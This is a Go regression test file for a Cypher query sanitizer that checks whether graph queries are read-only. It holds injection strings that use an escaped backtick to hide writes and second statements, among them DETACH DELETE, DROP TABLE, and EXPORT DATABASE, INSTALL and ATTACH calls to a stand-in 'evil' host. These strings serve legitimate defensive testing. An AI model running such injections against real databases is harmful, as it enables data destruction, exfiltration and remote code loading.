package graphquery

import "testing"

// A backtick-quoted identifier ends at the next backtick — the Cypher grammar is
// `EscapedSymbolicName_0 : ~[`]`, i.e. ANY character including a backslash.
// Treating \ as an escape inside backticks made this sanitizer disagree with the
// engine, and the disagreement was a complete bypass: the scan ran to end-of-input
// and returned a prefix, hiding both the write clause and the ';' the
// single-statement check relies on.
//
// Ladybug executes every ';'-separated statement in one call, and oC_Statement admits
// INSTALL/LOAD EXTENSION (remote code load in the worker pod), EXPORT DATABASE,
// ATTACH and DROP. This guard is the only chokepoint for all five untrusted-Cypher
// entry points, four of which a viewer can reach.
func TestIsReadOnly_BacktickBackslashCannotHideAWrite(t *testing.T) {
	bypasses := []struct {
		name, query string
	}{
		{"detach delete behind an escaped backtick", "MATCH (`n\\`) DETACH DELETE n RETURN 1"},
		{"second statement behind an escaped backtick", "MATCH (`n\\`) RETURN 1; EXPORT DATABASE 'http://evil/x'"},
		{"extension install behind an escaped backtick", "MATCH (`n\\`) RETURN 1; INSTALL httpfs FROM 'http://evil'"},
		{"attach behind an escaped backtick", "MATCH (`n\\`) RETURN 1; ATTACH 'http://evil/db' AS e"},
		{"create behind an escaped backtick", "MATCH (`x\\`) CREATE (m:Evil) RETURN 1"},
		{"drop behind an escaped backtick", "MATCH (`x\\`) RETURN 1; DROP TABLE Asset"},
		{"trailing backslash in a relationship identifier", "MATCH ()-[`r\\`]-() DELETE r"},
	}
	for _, tt := range bypasses {
		t.Run(tt.name, func(t *testing.T) {
			if IsReadOnly(tt.query) {
				t.Fatalf("IsReadOnly accepted a write: %s\nsanitized=%q", tt.query, sanitized(tt.query))
			}
		})
	}
}

// The fix must not break legitimate backtick identifiers, which are the whole
// reason the branch exists — a quoted label or property containing a space,
// a hyphen, or a keyword.
func TestIsReadOnly_LegitimateBacktickIdentifiersStillPass(t *testing.T) {
	ok := []string{
		"MATCH (n:`Asset Type`) RETURN n",
		"MATCH (n) RETURN n.`my property`",
		"MATCH (n:`weird-label`)-[:`HAS ROLE`]->(m) RETURN n, m",
		"MATCH (n:Asset) WHERE n.`id` = 'x' RETURN n",
	}
	for _, q := range ok {
		t.Run(q, func(t *testing.T) {
			if !IsReadOnly(q) {
				t.Fatalf("IsReadOnly rejected a legitimate read: %s\nsanitized=%q", q, sanitized(q))
			}
		})
	}
}

// Backslash escaping is still honoured inside STRING literals, where the grammar
// does define it — removing it there would be the mirror-image bug, letting a
// write clause hide inside an escaped quote.
func TestIsReadOnly_StringLiteralsStillHonourBackslashEscapes(t *testing.T) {
	// The \' is an escaped quote, so the literal continues and the DELETE is
	// inside it — this is a read.
	if !IsReadOnly(`MATCH (n) WHERE n.x = 'it\'s DELETE not really' RETURN n`) {
		t.Fatal("escaped quote inside a string literal must keep the literal open")
	}
	// And a genuine write outside any literal is still caught.
	if IsReadOnly(`MATCH (n) WHERE n.x = 'safe' DETACH DELETE n`) {
		t.Fatal("a write outside a string literal must be rejected")
	}
}

// sanitize must terminate and produce a prefix, never consume the whole query,
// when a backtick region is genuinely unterminated.
func TestSanitize_UnterminatedBacktickDoesNotSwallowInput(t *testing.T) {
	got, _ := sanitize("MATCH (`n\\`) DETACH DELETE n")
	if got == "MATCH (" {
		t.Fatalf("sanitize still swallows the remainder: %q", got)
	}
	if !containsFold(got, "DELETE") {
		t.Fatalf("sanitize dropped the write clause: %q", got)
	}
}

func containsFold(s, sub string) bool {
	return len(s) >= len(sub) && indexFold(s, sub) >= 0
}

func indexFold(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		match := true
		for j := 0; j < len(sub); j++ {
			a, b := s[i+j], sub[j]
			if 'a' <= a && a <= 'z' {
				a -= 32
			}
			if 'a' <= b && b <= 'z' {
				b -= 32
			}
			if a != b {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}
